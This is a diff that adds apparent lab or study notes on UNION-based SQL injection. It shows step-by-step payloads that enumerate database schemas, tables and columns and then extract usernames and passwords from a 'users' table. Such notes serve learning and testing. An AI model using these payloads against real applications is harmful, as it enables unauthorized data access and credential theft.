@@ -85,6 +85,32 @@ Most database types (with the notable exception of Oracle) have a set of views c
 	SELECT * FROM information_schema.columns WHERE table_name = 'Users
 	
 	
+ **Use the following payload to retrieve the list of database:**
+ 
+	' UNION select schema_name,NUll from INFORMATION_SCHEMA.SCHEMATA--
+	
+**2.Use the following payload to retrieve the list of tables in the database:**
+
+	'UNION SELECT table_name,NULL FROM information_schema.tables--
+	
+schema_name=database;
+
+information_schema=databaseName
+
+**3.Use the following payload (replacing the table name) to retrieve the details of the columns in the table**
+
+ 'UNION SELECT column_name ,NULL FROM information_schema.columns WHERE table_name='users_uvlvoo'—
+
+**4. To find information of username and password**
+
+	‘ UNION SELECT username_jovsyx, password_abwqcw FROM users_uvlvoo– 
+	
+    concate: ' UNION SELECT NULL,username || '---->' || password FROM users--
+
+![image](https://user-images.githubusercontent.com/37367596/192010124-561016c4-f865-469f-9c8d-6f0a388e86b1.png)
+
+	
+	
 
 	
 
